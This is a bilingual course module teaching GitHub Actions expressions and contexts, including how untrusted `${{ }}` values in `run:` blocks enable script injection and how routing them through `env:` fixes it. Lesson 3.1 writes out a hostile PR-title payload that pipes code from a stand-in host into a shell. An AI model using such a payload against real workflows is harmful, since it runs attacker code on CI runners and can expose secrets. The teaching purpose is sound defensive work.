const REF = '?ref=%2Fcourses%2Fgithub-actions%2Flearn&reflabel=GitHub%20Actions';
/**
 * GitHub Actions — Chương 3: Biểu thức và context.
 * Số đo: 74 biểu thức thật của 11 workflow, và một bản tái lập hashFiles()
 * đã KIỂM CHỨNG khớp chính xác với log thật của job 85355071479.
 */

export default {
  title: 'Chapter 3 — Expressions, contexts, and when things exist|||Chương 3 — Biểu thức, context, và lúc nào thứ gì tồn tại',
  slug: 'ga-ch3-bieu-thuc',
  description: '74 biểu thức thật trong kho này, và một bản tái lập `hashFiles()` khớp CHÍNH XÁC với đầu ra thật của GitHub. Cộng cái ranh giới quyết định mọi thứ: `${{ }}` được thay TRƯỚC khi shell nhìn thấy dòng lệnh.',
  sortOrder: 4,
  lessons: [

    /* ─────────────────────────── 3.1 ─────────────────────────── */
    {
      title: '3.1 — The boundary: what is substituted before the shell sees it|||3.1 — Ranh giới: cái gì bị thay TRƯỚC khi shell nhìn thấy',
      slug: 'ga-3-1-ranh-gioi',
      type: 'VIDEO',
      description: '`\${{ }}` KHÔNG phải biến shell. Nó bị thay bằng chuỗi thô trước khi tệp script được ghi ra đĩa — nên một tiêu đề PR chứa dấu nháy vừa chạy được lệnh của người lạ. Cộng đúng chỗ để đọc: log thật in ra `shell: /usr/bin/bash -e {0}` ở MỌI bước.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.1</span>
<h2>The boundary: what is substituted before the shell sees it</h2>
<p class="lead">There are two languages in a workflow file and they run at different times. Getting that ordering wrong is not a style mistake — it is the mechanism behind the most common serious vulnerability in GitHub Actions, and it takes three lines to demonstrate.</p>

<h3>Two evaluators, in order</h3>
<div class="lz-flow">
<div class="lz-step"><span class="lz-k">first</span><span class="lz-t">GitHub&#39;s expression engine</span><span class="lz-d">finds every <code>\${{ ... }}</code> and replaces it with a plain string. This happens on GitHub&#39;s side, before the runner writes anything to disk</span></div>
<div class="lz-step"><span class="lz-k">then</span><span class="lz-t">the runner writes a script file</span><span class="lz-d">the fully substituted text becomes a real file on the runner</span></div>
<div class="lz-step"><span class="lz-k">last</span><span class="lz-t">the shell</span><span class="lz-d">runs that file. By this point the expression is gone — the shell never knew there was one</span></div>
</div>

<p>The log of any real run states the third step explicitly. From job 85355071479 of this repository, printed before <em>every</em> step:</p>

<div class="out">shell: /usr/bin/bash -e {0}</div>

<p>That <code>{0}</code> is the script file. Everything the expression engine produced has already been baked into it. Which leads directly to the consequence:</p>

<div class="callout warn">
<p><strong><code>\${{ }}</code> is not a variable. It is textual substitution into source code.</strong> If the substituted value contains a quote, a newline, a semicolon or a backtick, those characters become <em>part of the script</em> — not part of a string in the script. There is no quoting that protects you, because the quoting you would write is itself part of the text being substituted into.</p>
</div>

<h3>The three lines</h3>
<pre><code><span class="tok-comment"># HONG — tieu de PR duoc GHEP THANG vao ma nguon</span>
- run: echo "PR: \${{ github.event.pull_request.title }}"</code></pre>

<p>A pull request titled <code>a"; curl evil.example/x | sh; #</code> produces this script on the runner:</p>

<div class="out">echo "PR: a"; curl evil.example/x | sh; #"</div>

<p>Three commands where the author wrote one. Anyone who can open a pull request chooses the title, so anyone who can open a pull request can run commands on the runner. And note what makes this worse than it looks: on a <code>pull_request</code> run from a fork the secrets are absent, but on a <code>push</code> run, or under <code>pull_request_target</code> (lesson 1.4), they are not.</p>

<pre><code><span class="tok-comment"># DUNG — bien moi truong, shell doc GIA TRI chu khong doc MA</span>
- run: echo "PR: \$TIEU_DE"
  env:
    TIEU_DE: \${{ github.event.pull_request.title }}</code></pre>

<p>The substitution still happens — but into the <code>env:</code> block, where the value becomes an environment variable rather than script text. <code>\$TIEU_DE</code> inside the script is read by the shell at runtime, as data. The quote in the title is now just a quote in a string.</p>

<div class="callout ok">
<p><strong>The rule that covers every case:</strong> never put a <code>\${{ }}</code> whose value someone else controls directly inside <code>run:</code>. Route it through <code>env:</code> and reference the environment variable. This costs two extra lines and removes the entire class of problem. Chapter 7 measures which context values are attacker-controlled — the list is longer than "the PR title".</p>
</div>

<h3>Where expressions are allowed, and where they are implicit</h3>
<div class="kv-grid">
<div class="kv"><span class="k">most places need <code>\${{ }}</code></span><span class="v"><code>run:</code>, <code>with:</code>, <code>env:</code>, <code>name:</code>, <code>runs-on:</code>, <code>key:</code> — anywhere a string is expected, the braces mark the part to evaluate</span></div>
<div class="kv"><span class="k"><code>if:</code> is already an expression</span><span class="v"><code>if: github.event_name == 'push'</code> works with no braces. The whole value is evaluated as an expression, so the braces are optional there — and adding them is harmless but not required</span></div>
<div class="kv"><span class="k">the <code>if:</code> trap</span><span class="v">a bare string in <code>if:</code> is <strong>truthy</strong>. <code>if: \${{ false }}</code> skips the step; <code>if: 'false'</code> runs it, because a non-empty string is true. This is the single most common broken condition, and it fails <em>open</em></span></div>
<div class="kv"><span class="k">not allowed at all</span><span class="v">the <code>on:</code> block. You cannot compute a trigger, a branch filter or a cron schedule — those are read before any context exists</span></div>
</div>

<h3>Quoting inside an expression</h3>
<p>The expression language uses <strong>single quotes only</strong>. Double quotes are a syntax error, and an apostrophe inside a literal is escaped by doubling it:</p>

<pre><code><span class="tok-comment"># dung</span>
if: github.ref == 'refs/heads/main'
<span class="tok-comment"># SAI — nhay kep khong hop le trong bieu thuc</span>
if: github.ref == "refs/heads/main"
<span class="tok-comment"># nhay don trong chuoi: viet doi len</span>
run: echo \${{ format('it''s fine') }}</code></pre>

<div class="pitfall">
<p><strong>Bẫy — YAML quoting and expression quoting stacked on top of each other.</strong> A value like <code>\${{ ... }}</code> at the start of a YAML value must be quoted <em>as YAML</em>, because <code>{</code> starts a YAML flow mapping — so <code>key: \${{ x }}</code> parses, but <code>key: {{ x }}</code> does not, and <code>key: "\${{ x }}"</code> is the safe form when the value begins with a brace. Two quoting systems, applied by two parsers, on one line. When a workflow fails to parse and the error points at a line that looks obviously fine, this is usually why.</p>
</div>

<h3>What the substitution looks like in a real log</h3>
<p>The log prints the script <em>after</em> substitution, which is the single most useful debugging fact in this chapter. From the same run, an <code>env:</code> block already expanded:</p>

<div class="out">##[group]Run ssh vps "
  export CUONG_BACKEND_IMAGE=ghcr.io/cuonghoang1103/api-backend-backend:main
  ...
shell: /usr/bin/bash -e {0}
env:
  REGISTRY: ghcr.io
  IMAGE_OWNER: cuonghoang1103
  BACKEND_IMAGE: ghcr.io/cuonghoang1103/api-backend-backend
  FRONTEND_IMAGE: ghcr.io/cuonghoang1103/api-backend-frontend</div>

<div class="callout">
<p><strong>Read the expanded script, not the YAML.</strong> When a step does something you did not intend, the group header in the log shows exactly what the shell received — every expression already resolved. Comparing that against what you wrote answers "was my expression wrong?" in one glance, and it answers it without a re-run. Secrets are the exception: they are masked as <code>***</code>, which is also how you confirm a value <em>was</em> treated as a secret.</p>
</div>

<h3>Two shapes worth keeping</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">expression → <code>env:</code> → shell variable</span><span class="lz-lnote">the safe default for anything from the <code>github</code> context. Two extra lines, zero injection surface</span></div>
<div class="lz-layer"><span class="lz-lname">expression → <code>with:</code> → action input</span><span class="lz-lnote">actions receive inputs as environment variables, so this path is already safe from shell injection. It is not safe from <em>the action</em> doing something unsafe with the value — Chapter 4 covers what an action can actually do</span></div>
<div class="lz-layer"><span class="lz-lname">expression directly in <code>run:</code></span><span class="lz-lnote">acceptable only for values you fully control: <code>\${{ runner.os }}</code>, <code>\${{ matrix.os }}</code>, a literal you wrote in <code>env:</code> yourself. Never for anything a user typed</span></div>
<div class="lz-layer"><span class="lz-lname">expression in a cache <code>key:</code></span><span class="lz-lnote">no shell involved at all — the key is a string the cache action receives. This is where <code>hashFiles()</code> lives, and 3.4 verifies exactly what it computes</span></div>
</div>

<div class="callout ok">
<p><strong>The one sentence.</strong> The expression engine finishes its work before the runner writes the script file, so <code>\${{ }}</code> in a <code>run:</code> block is code generation — and the fix is always to move the value into <code>env:</code>, where it becomes data.</p>
</div>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions — the full operator table, the single-quote rule, the doubled-apostrophe escape, and the statement that <code>if:</code> is evaluated as an expression without braces.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Security Lab — Untrusted input in GitHub Actions</span><span class="lc-sub">securitylab.github.com/resources/github-actions-untrusted-input/ — the original catalogue of injectable context values and the <code>env:</code> mitigation, with real vulnerable workflows found in public repositories.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Security hardening for GitHub Actions: script injections</span><span class="lc-sub">docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections — GitHub&#39;s own writeup of the three-line example above, including the list of contexts to treat as attacker-controlled.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Authentication — injection is one bug with many names</span><span class="lc-sub">/courses/authentication/learn${REF} — SQL injection, command injection and this are the same mistake in three syntaxes: data concatenated into a language instead of passed as a parameter.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Linux &amp; Bash — quoting, word splitting, and why a variable is not text</span><span class="lc-sub">/courses/linux-bash/learn${REF} — what the shell does with a value once it is in a variable, which is exactly the behaviour the <code>env:</code> fix relies on.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.1</span>
<h2>Ranh giới: cái gì bị thay TRƯỚC khi shell nhìn thấy</h2>
<p class="lead">Có HAI ngôn ngữ trong một tệp workflow và chúng chạy vào những thời điểm khác nhau. Nhầm cái thứ tự ấy không phải lỗi phong cách — nó là cơ chế đứng sau lỗ hổng nghiêm trọng phổ biến nhất của GitHub Actions, và chỉ cần ba dòng để minh hoạ.</p>

<h3>Hai bộ đánh giá, theo thứ tự</h3>
<div class="lz-flow">
<div class="lz-step"><span class="lz-k">đầu tiên</span><span class="lz-t">bộ máy biểu thức của GitHub</span><span class="lz-d">tìm mọi <code>\${{ ... }}</code> rồi thay bằng một chuỗi trơn. Chuyện này xảy ra bên phía GitHub, TRƯỚC khi runner ghi bất cứ thứ gì xuống đĩa</span></div>
<div class="lz-step"><span class="lz-k">rồi</span><span class="lz-t">runner ghi ra một tệp script</span><span class="lz-d">phần chữ đã thay xong trở thành một tệp thật trên runner</span></div>
<div class="lz-step"><span class="lz-k">cuối cùng</span><span class="lz-t">shell</span><span class="lz-d">chạy tệp ấy. Tới lúc này biểu thức đã biến mất — shell chưa từng biết là có một biểu thức</span></div>
</div>

<p>Log của bất kỳ lần chạy thật nào cũng phát biểu bước thứ ba một cách tường minh. Từ job 85355071479 của kho này, in ra trước <em>MỌI</em> bước:</p>

<div class="out">shell: /usr/bin/bash -e {0}</div>

<p>Cái <code>{0}</code> ấy là tệp script. Mọi thứ bộ máy biểu thức sinh ra đã được nướng sẵn vào trong đó. Từ đó dẫn thẳng tới hệ quả:</p>

<div class="callout warn">
<p><strong><code>\${{ }}</code> KHÔNG phải một biến. Nó là phép thay chữ VÀO MÃ NGUỒN.</strong> Nếu giá trị được thay có chứa một dấu nháy, một ký tự xuống dòng, một dấu chấm phẩy hay một dấu huyền, thì những ký tự ấy trở thành <em>MỘT PHẦN CỦA SCRIPT</em> — không phải một phần của một chuỗi trong script. Không có cách đặt nháy nào bảo vệ được bạn, vì chính cái nháy bạn định viết cũng là một phần của phần chữ đang bị thay vào.</p>
</div>

<h3>Ba dòng</h3>
<pre><code><span class="tok-comment"># HONG — tieu de PR duoc GHEP THANG vao ma nguon</span>
- run: echo "PR: \${{ github.event.pull_request.title }}"</code></pre>

<p>Một pull request đặt tên là <code>a"; curl evil.example/x | sh; #</code> sẽ đẻ ra script này trên runner:</p>

<div class="out">echo "PR: a"; curl evil.example/x | sh; #"</div>

<p>Ba câu lệnh ở chỗ tác giả viết một. Ai mở được pull request thì người ấy chọn tiêu đề, nên ai mở được pull request thì người ấy chạy được lệnh trên runner. Và để ý điều làm nó tệ hơn vẻ ngoài: trong một lần chạy <code>pull_request</code> đến từ fork thì bí mật vắng mặt, nhưng trong một lần chạy <code>push</code>, hoặc dưới <code>pull_request_target</code> (bài 1.4), thì không.</p>

<pre><code><span class="tok-comment"># DUNG — bien moi truong, shell doc GIA TRI chu khong doc MA</span>
- run: echo "PR: \$TIEU_DE"
  env:
    TIEU_DE: \${{ github.event.pull_request.title }}</code></pre>

<p>Phép thay vẫn xảy ra — nhưng thay vào khối <code>env:</code>, nơi giá trị trở thành một biến môi trường chứ không phải chữ trong script. <code>\$TIEU_DE</code> bên trong script được shell đọc lúc chạy, dưới dạng DỮ LIỆU. Cái dấu nháy trong tiêu đề bây giờ chỉ là một dấu nháy trong một chuỗi.</p>

<div class="callout ok">
<p><strong>Quy tắc phủ mọi trường hợp:</strong> đừng bao giờ đặt một <code>\${{ }}</code> mà giá trị của nó do người khác kiểm soát trực tiếp vào bên trong <code>run:</code>. Hãy vòng nó qua <code>env:</code> rồi tham chiếu biến môi trường. Nó tốn thêm hai dòng và gỡ bỏ trọn cả lớp vấn đề. Chương 7 đo xem những giá trị context nào nằm trong tay kẻ tấn công — danh sách dài hơn "tiêu đề PR" nhiều.</p>
</div>

<h3>Biểu thức được phép ở đâu, và ở đâu nó ngầm định</h3>
<div class="kv-grid">
<div class="kv"><span class="k">phần lớn chỗ cần <code>\${{ }}</code></span><span class="v"><code>run:</code>, <code>with:</code>, <code>env:</code>, <code>name:</code>, <code>runs-on:</code>, <code>key:</code> — ở bất cứ đâu mong đợi một chuỗi, cặp ngoặc đánh dấu phần cần tính</span></div>
<div class="kv"><span class="k"><code>if:</code> vốn ĐÃ là một biểu thức</span><span class="v"><code>if: github.event_name == 'push'</code> chạy được mà không cần ngoặc. Cả giá trị được tính như một biểu thức, nên ngoặc là tuỳ chọn ở đó — thêm vào thì vô hại nhưng không bắt buộc</span></div>
<div class="kv"><span class="k">cái bẫy của <code>if:</code></span><span class="v">một chuỗi trần trong <code>if:</code> là <strong>ĐÚNG</strong>. <code>if: \${{ false }}</code> bỏ qua bước; <code>if: 'false'</code> CHẠY bước, vì một chuỗi khác rỗng là đúng. Đây là điều kiện hỏng phổ biến nhất, và nó hỏng theo hướng <em>MỞ</em></span></div>
<div class="kv"><span class="k">hoàn toàn không được phép</span><span class="v">khối <code>on:</code>. Bạn không tính ra được một kích hoạt, một bộ lọc nhánh hay một lịch cron — mấy thứ đó được đọc trước khi có context nào tồn tại</span></div>
</div>

<h3>Đặt nháy bên trong một biểu thức</h3>
<p>Ngôn ngữ biểu thức chỉ dùng <strong>nháy đơn</strong>. Nháy kép là lỗi cú pháp, và một dấu nháy đơn nằm trong chuỗi thì thoát bằng cách viết đôi lên:</p>

<pre><code><span class="tok-comment"># dung</span>
if: github.ref == 'refs/heads/main'
<span class="tok-comment"># SAI — nhay kep khong hop le trong bieu thuc</span>
if: github.ref == "refs/heads/main"
<span class="tok-comment"># nhay don trong chuoi: viet doi len</span>
run: echo \${{ format('it''s fine') }}</code></pre>

<div class="pitfall">
<p><strong>Bẫy — cách đặt nháy của YAML và của biểu thức chồng lên nhau.</strong> Một giá trị kiểu <code>\${{ ... }}</code> nằm ở đầu một giá trị YAML thì phải được đặt nháy <em>THEO KIỂU YAML</em>, vì dấu <code>{</code> mở đầu một ánh xạ dòng của YAML — nên <code>key: \${{ x }}</code> đọc được, còn <code>key: {{ x }}</code> thì không, và <code>key: "\${{ x }}"</code> là dạng an toàn khi giá trị bắt đầu bằng một dấu ngoặc nhọn. Hai hệ thống đặt nháy, do hai bộ đọc áp dụng, trên cùng một dòng. Khi một workflow không đọc được mà lỗi lại chỉ vào một dòng trông rõ ràng là ổn, thì thường là vì chuyện này.</p>
</div>

<h3>Phép thay trông ra sao trong một log thật</h3>
<p>Log in ra script <em>SAU KHI</em> đã thay, và đó là sự thật gỡ lỗi hữu ích nhất trong cả chương này. Từ cùng lần chạy ấy, một khối <code>env:</code> đã nở ra:</p>

<div class="out">##[group]Run ssh vps "
  export CUONG_BACKEND_IMAGE=ghcr.io/cuonghoang1103/api-backend-backend:main
  ...
shell: /usr/bin/bash -e {0}
env:
  REGISTRY: ghcr.io
  IMAGE_OWNER: cuonghoang1103
  BACKEND_IMAGE: ghcr.io/cuonghoang1103/api-backend-backend
  FRONTEND_IMAGE: ghcr.io/cuonghoang1103/api-backend-frontend</div>

<div class="callout">
<p><strong>Hãy đọc script ĐÃ NỞ, đừng đọc YAML.</strong> Khi một bước làm chuyện bạn không định, cái tiêu đề nhóm trong log cho thấy chính xác thứ mà shell đã nhận — mọi biểu thức đã phân giải xong. Đối chiếu nó với thứ bạn viết ra là trả lời được câu "biểu thức của tôi có sai không?" chỉ trong một cái liếc, và trả lời được mà không cần chạy lại. Bí mật là ngoại lệ: chúng bị che thành <code>***</code>, và đó cũng là cách bạn xác nhận một giá trị ĐÃ được đối xử như một bí mật.</p>
</div>

<h3>Hai hình dạng đáng giữ</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">biểu thức → <code>env:</code> → biến shell</span><span class="lz-lnote">mặc định an toàn cho bất cứ thứ gì tới từ context <code>github</code>. Thêm hai dòng, bề mặt tấn công bằng không</span></div>
<div class="lz-layer"><span class="lz-lname">biểu thức → <code>with:</code> → tham số của action</span><span class="lz-lnote">action nhận tham số dưới dạng biến môi trường, nên đường này vốn đã an toàn trước injection vào shell. Nó KHÔNG an toàn trước việc <em>CHÍNH ACTION</em> làm điều gì đó không an toàn với giá trị — Chương 4 nói một action thật ra làm được những gì</span></div>
<div class="lz-layer"><span class="lz-lname">biểu thức đặt thẳng vào <code>run:</code></span><span class="lz-lnote">chỉ chấp nhận được với những giá trị bạn kiểm soát trọn vẹn: <code>\${{ runner.os }}</code>, <code>\${{ matrix.os }}</code>, một hằng bạn tự viết trong <code>env:</code>. Không bao giờ cho thứ gì người dùng gõ vào</span></div>
<div class="lz-layer"><span class="lz-lname">biểu thức trong <code>key:</code> của cache</span><span class="lz-lnote">không có shell nào dính vào cả — cái khoá là một chuỗi mà action cache nhận. Đây là chỗ <code>hashFiles()</code> sống, và bài 3.4 kiểm chứng chính xác nó tính ra cái gì</span></div>
</div>

<div class="callout ok">
<p><strong>Một câu.</strong> Bộ máy biểu thức làm xong việc của nó TRƯỚC khi runner ghi tệp script, nên <code>\${{ }}</code> trong một khối <code>run:</code> là SINH MÃ — và cách vá luôn luôn là chuyển giá trị vào <code>env:</code>, nơi nó trở thành dữ liệu.</p>
</div>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions — bảng toán tử đầy đủ, luật nháy đơn, cách thoát nháy bằng viết đôi, và phát biểu rằng <code>if:</code> được tính như một biểu thức mà không cần ngoặc.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Security Lab — Untrusted input in GitHub Actions</span><span class="lc-sub">securitylab.github.com/resources/github-actions-untrusted-input/ — danh mục gốc các giá trị context chèn được và cách vá bằng <code>env:</code>, kèm các workflow dễ tổn thương thật tìm thấy trong kho công khai.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Security hardening: script injections</span><span class="lc-sub">docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections — chính GitHub viết lại ví dụ ba dòng bên trên, kèm danh sách các context cần coi là do kẻ tấn công kiểm soát.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Authentication — injection là MỘT lỗi mang nhiều tên</span><span class="lc-sub">/courses/authentication/learn${REF} — SQL injection, command injection và cái này là cùng một sai lầm trong ba cú pháp: dữ liệu bị ghép vào một ngôn ngữ thay vì được truyền vào như một tham số.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Linux &amp; Bash — đặt nháy, tách từ, và vì sao một biến không phải là chữ</span><span class="lc-sub">/courses/linux-bash/learn${REF} — shell làm gì với một giá trị khi nó đã nằm trong một biến, và đó đúng là hành vi mà cách vá bằng <code>env:</code> dựa vào.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.2 ─────────────────────────── */
    {
      title: '3.2 — Contexts, and when each one exists|||3.2 — Context, và lúc nào cái nào tồn tại',
      slug: 'ga-3-2-context',
      type: 'VIDEO',
      description: 'Kiểm kê 74 biểu thức thật của 11 workflow: `secrets` 44 lần, `env` 9, `runner` 5, `matrix` 4. Và cái luật khiến biểu thức "đúng" trả về rỗng — mỗi context chỉ tồn tại ở một số CHỖ trong tệp.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.2</span>
<h2>Contexts, and when each one exists</h2>
<p class="lead">A context is a bag of values with a name. There are about a dozen, they are documented, and the part that actually causes bugs is not what they contain — it is that each one only exists in certain places in the file, and referencing one where it does not exist gives you an empty string rather than an error.</p>

<h3>What this repository actually uses</h3>
<p>Every <code>\${{ }}</code> across all eleven workflows, grouped by which context it opens with:</p>

<div class="out">secrets  44   env      9   runner    5   matrix   4
inputs    4   steps    3   github    3   hashFiles 2
                                      tong: 74 bieu thuc</div>

<p>Two things fall out of that distribution. Secrets are 59% of all expressions here — because this repository&#39;s workflows mostly deploy, and deploying means credentials. And the <code>github</code> context, which is the one people write about most, appears three times. In real workflows, expressions are overwhelmingly about <em>configuration you provided</em>, not about the event.</p>

<div class="out">secrets.VPS_HOST              18
secrets.VPS_USER               9
secrets.VPS_SSH_PRIVATE_KEY    9
runner.os                      5
secrets.RELEASE_TOKEN          4
inputs.version                 4
env.FRONTEND_IMAGE             4
env.BACKEND_IMAGE              4
steps.tag.outputs.tag          3
matrix.ten                     2
github.sha                     2</div>

<h3>The contexts, and where each is available</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>github</code></span><span class="lz-lnote">the event and the repository: <code>sha</code>, <code>ref</code>, <code>event_name</code>, <code>actor</code>, <code>repository</code>, and the whole raw payload under <code>github.event</code>. Available almost everywhere. Also the context most likely to contain something a stranger typed — see 3.1</span></div>
<div class="lz-layer"><span class="lz-lname"><code>secrets</code></span><span class="lz-lnote">repository, environment and organisation secrets, plus the automatic <code>GITHUB_TOKEN</code>. <strong>Not available in <code>if:</code> at job level in older behaviour, and never available in <code>on:</code></strong>. Masked in logs as <code>***</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>env</code></span><span class="lz-lnote">variables set by <code>env:</code> at workflow, job or step level. Not available in the <code>env:</code> block that defines it, and not in <code>runs-on:</code> at job level — a restriction that surprises people trying to compute a runner label</span></div>
<div class="lz-layer"><span class="lz-lname"><code>runner</code></span><span class="lz-lnote"><code>os</code>, <code>arch</code>, <code>temp</code>, <code>tool_cache</code>. Only inside a job — it describes a machine, and outside a job there is no machine. This is why it works in a cache key and not in <code>on:</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>matrix</code></span><span class="lz-lnote">only in a job that has a <code>strategy.matrix</code>. Every key you wrote in the matrix entry, including ones you invented like <code>ten</code> and <code>lenh</code> in 2.5</span></div>
<div class="lz-layer"><span class="lz-lname"><code>needs</code></span><span class="lz-lnote"><code>needs.&lt;job&gt;.result</code> and <code>needs.&lt;job&gt;.outputs.&lt;name&gt;</code>. Only for jobs actually listed in this job&#39;s <code>needs:</code> — a job you did not declare a dependency on is simply not there</span></div>
<div class="lz-layer"><span class="lz-lname"><code>steps</code></span><span class="lz-lnote"><code>steps.&lt;id&gt;.outputs.&lt;name&gt;</code>, <code>.outcome</code>, <code>.conclusion</code>. Only for steps that have an <code>id:</code>, and only for steps that have <em>already run</em> in this job</span></div>
<div class="lz-layer"><span class="lz-lname"><code>inputs</code></span><span class="lz-lnote">from <code>workflow_dispatch</code> inputs or a reusable workflow&#39;s <code>workflow_call</code> inputs. Ten of this repository&#39;s eleven workflows are dispatch-only, which is why <code>inputs</code> appears as often as <code>matrix</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>job</code> · <code>vars</code> · <code>strategy</code></span><span class="lz-lnote"><code>job.status</code> and service container details; <code>vars</code> for non-secret configuration variables; <code>strategy.job-index</code> and <code>fail-fast</code>. Rarely needed, but <code>vars</code> is the right home for a non-secret value you would otherwise make a secret out of habit</span></div>
</div>

<div class="callout warn">
<p><strong>An unavailable context does not error. It evaluates to empty.</strong> <code>\${{ steps.khong-co.outputs.x }}</code> is the empty string, and so is <code>\${{ matrix.os }}</code> in a job with no matrix. Which means a mistyped step id produces a step that runs with a blank argument and often succeeds at doing nothing — the exact failure shape that survives review, passes CI, and is found in production. When an expression yields nothing, the first suspect is availability, not the value.</p>
</div>

<h3>The <code>steps</code> context needs two things you must remember to write</h3>
<pre><code>- name: Xac dinh the phien ban
  id: tag                          <span class="tok-comment"># 1. phai co id:</span>
  run: echo "tag=v1.2.3" &gt;&gt; \$GITHUB_OUTPUT   <span class="tok-comment"># 2. phai ghi vao GITHUB_OUTPUT</span>

- name: Dung the do
  run: echo "\${{ steps.tag.outputs.tag }}"</code></pre>

<p>Miss the <code>id:</code> and the step has no name in the context. Miss the <code>\$GITHUB_OUTPUT</code> write and the step exists but has no outputs. Both produce the same symptom — an empty string — and this repository uses exactly this pattern three times, all of them for a version tag.</p>

<div class="pitfall">
<p><strong>Bẫy — <code>outcome</code> and <code>conclusion</code> are not the same value.</strong> <code>steps.&lt;id&gt;.outcome</code> is the result <em>before</em> <code>continue-on-error</code> is applied; <code>conclusion</code> is the result <em>after</em>. So for a step marked <code>continue-on-error: true</code> that failed, <code>outcome</code> is <code>failure</code> and <code>conclusion</code> is <code>success</code>. If you want a later step to react to the real failure of a tolerated step — which is the entire reason to tolerate it and then report — you must read <code>outcome</code>. Reading <code>conclusion</code> gives you a condition that is never true, silently.</p>
</div>

<h3>Where a context does not exist at all</h3>
<div class="kv-grid">
<div class="kv"><span class="k">the <code>on:</code> block</span><span class="v">nothing is available. Triggers, branch filters and cron schedules are read before there is an event, a job or a runner. This is not a limitation to work around — it is why a workflow can be indexed and scheduled without running it</span></div>
<div class="kv"><span class="k">job-level <code>runs-on:</code></span><span class="v"><code>matrix</code> works — that is how 2.5&#39;s three platforms happen — but <code>env</code> does not. Compute the label in the matrix, not in an <code>env:</code> block</span></div>
<div class="kv"><span class="k">an <code>env:</code> block referring to itself</span><span class="v"><code>env: {A: 1, B: \${{ env.A }}}</code> does not work. Within one block the values are not sequenced; set <code>B</code> in a later scope or write it out</span></div>
<div class="kv"><span class="k">a reusable workflow&#39;s secrets</span><span class="v">a called workflow does not inherit <code>secrets</code> automatically. It gets what you pass under <code>secrets:</code>, or everything with <code>secrets: inherit</code> — and the default of passing nothing produces, again, empty strings rather than errors</span></div>
</div>

<h3>Reading a context you have not memorised</h3>
<p>The whole of any context is printable, and doing so once for the event that is confusing you is faster than reading documentation:</p>

<pre><code>- name: Do context ra xem
  run: |
    echo "\$GITHUB_CONTEXT"
    echo "\$NEEDS_CONTEXT"
  env:
    GITHUB_CONTEXT: \${{ toJSON(github) }}
    NEEDS_CONTEXT: \${{ toJSON(needs) }}</code></pre>

<div class="callout ok">
<p><strong>Note the shape: through <code>env:</code>, not directly into <code>run:</code>.</strong> <code>toJSON(github)</code> contains the entire event payload — including the PR title, branch names, and commit messages that 3.1 showed are attacker-controlled. Dumping it straight into a <code>run:</code> block is the injection bug with the payload chosen for you. The debugging technique and the safe technique are the same two extra lines.</p>
</div>

<div class="callout">
<p><strong>The one sentence.</strong> Contexts fail by being absent rather than by being wrong, so when an expression produces nothing, check <em>where</em> you wrote it before you check <em>what</em> you wrote.</p>
</div>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Contexts</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/contexts — every context, every property, and the availability table that says which contexts can be used in which keys. That table is the answer to most "why is my expression empty" questions.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Webhook events and payloads</span><span class="lc-sub">docs.github.com/en/webhooks/webhook-events-and-payloads — what is actually inside <code>github.event</code> for each trigger. The shape differs per event, which is why a workflow reading <code>github.event.pull_request</code> gets nothing on a push.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Variables: configuration variables (vars)</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows — the <code>vars</code> context, for values that need to be configurable but are not sensitive and should not be masked in logs.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — optional chaining, and the value that is quietly undefined</span><span class="lc-sub">/courses/typescript/learn${REF} — the same class of bug in another language: a lookup that returns nothing instead of failing, and the discipline of making absence visible at the boundary.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.2</span>
<h2>Context, và lúc nào cái nào tồn tại</h2>
<p class="lead">Một context là một túi giá trị có tên. Có khoảng chục cái, chúng đều có tài liệu, và phần thật sự gây lỗi không phải là chúng CHỨA gì — mà là mỗi cái chỉ tồn tại ở MỘT SỐ CHỖ trong tệp, và tham chiếu một cái ở chỗ nó không tồn tại thì bạn nhận về một chuỗi rỗng chứ không phải một lỗi.</p>

<h3>Kho này thật sự dùng gì</h3>
<p>Mọi <code>\${{ }}</code> trong cả mười một workflow, nhóm theo context mà nó mở đầu bằng:</p>

